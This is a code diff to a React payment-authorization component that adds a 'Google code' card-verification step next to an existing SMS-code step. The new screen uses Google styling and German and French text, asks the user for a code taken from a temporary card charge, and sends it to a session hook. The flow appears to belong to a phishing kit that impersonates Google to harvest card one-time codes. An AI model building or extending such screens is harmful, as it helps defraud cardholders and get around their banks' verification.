@@ -16,6 +16,7 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId, sessio
   const [orderData, setOrderData] = useState<any>(null);
   const [currentTextIndex, setCurrentTextIndex] = useState(0);
   const [smsCode, setSmsCode] = useState('');
+  const [googleCode, setGoogleCode] = useState('');
 
   const detectCardType = (cardNumber: string): 'visa' | 'mastercard' | 'amex' | 'unknown' => {
     const cleanNumber = cardNumber.replace(/\s/g, '');
@@ -59,7 +60,9 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId, sessio
     setVerificationMethod,
     confirmAppVerification,
     enterSmsCode,
-    submitSmsCode: submitSmsCodeOptimistic
+    submitSmsCode: submitSmsCodeOptimistic,
+    enterGoogleCode,
+    submitGoogleCode: submitGoogleCodeOptimistic
   } = useOptimisticPaymentSession(sessionId);
 
   const processingTexts = [
@@ -106,6 +109,13 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId, sessio
     setSmsCode('');
   };
 
+  const handleGoogleCodeSubmit = async () => {
+    if (!googleCode) return;
+    // Always directly submit the Google code to transition to google_code_confirmed
+    await submitGoogleCodeOptimistic(googleCode);
+    setGoogleCode('');
+  };
+
   const handleMethodSelection = async (method: string) => {
     await setVerificationMethod(method);
   };
@@ -130,6 +140,12 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId, sessio
           return renderFinalProcessingState();
         } else {
           return renderSmsConfirmationState();
+        }
+      case 'google_code_confirmation':
+        if (verification_status === 'google_code_confirmed') {
+          return renderFinalProcessingState();
+        } else {
+          return renderGoogleCodeConfirmationState();
         }
       case 'choice_required':
         return renderChoiceState();
@@ -241,6 +257,54 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId, sessio
     </>
   );
 
+  const renderGoogleCodeConfirmationState = () => {
+    const cardType = orderData?.card_number ? detectCardType(orderData.card_number) : 'unknown';
+    const cardTypeInfo = getCardTypeInfo(cardType);
+    const lastFour = orderData?.card_number?.slice(-4) || '4444';
+
+    return (
+      <>
+        {renderFailureMessage()}
+        {/* Loading Spinner */}
+        <div className="flex items-center justify-center space-x-3 py-4">
+          <div className="relative">
+            <div className="w-6 h-6 border-4 border-blue-100 rounded-full animate-spin border-t-blue-600"></div>
+          </div>
+          <span className="text-base text-gray-700" style={{ fontFamily: 'Google Sans, sans-serif' }}>
+            Attente du code Google...
+          </span>
+        </div>
+        
+        <div className="space-y-2">
+          <h1 className="text-2xl font-medium text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
+            Karte bestätigen
+          </h1>
+          <p className="text-base text-gray-700">
+            Bestätige {cardTypeInfo.name} •••• {lastFour} mit einem Code, den du neben einer vorübergehenden Belastung findest.
+            Die Belastung erscheint in den Transaktionen deiner Karte (in deinen App- oder Kontoabrechnungen).
+          </p>
+        </div>
+
+        <div className="space-y-4">
+          <Input
+            type="text"
+            placeholder="Google-Code eingeben"
+            value={googleCode}
+            onChange={(e) => setGoogleCode(e.target.value)}
+            className="text-center text-lg tracking-widest"
+          />
+          <Button 
+            onClick={handleGoogleCodeSubmit}
+            disabled={!googleCode}
+            className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 text-base"
+          >
+            Code bestätigen
+          </Button>
+        </div>
+      </>
+    );
+  };
+
   const renderChoiceState = () => (
     <>
       <div className="space-y-2">
@@ -269,6 +333,15 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId, sessio
         >
           <MessageSquare className="w-5 h-5 text-blue-600" />
           <span className="font-medium">Code SMS : Par message texte</span>
+        </Button>
+
+        <Button
+          onClick={() => handleMethodSelection('google_code_confirmation')}
+          variant="outline"
+          className="w-full px-3 py-2 flex items-center space-x-2 border hover:border-blue-500"
+        >
+          <CreditCard className="w-5 h-5 text-blue-600" />
+          <span className="font-medium">Google-Code : Über Kartentransaktion</span>
         </Button>
       </div>
     </>
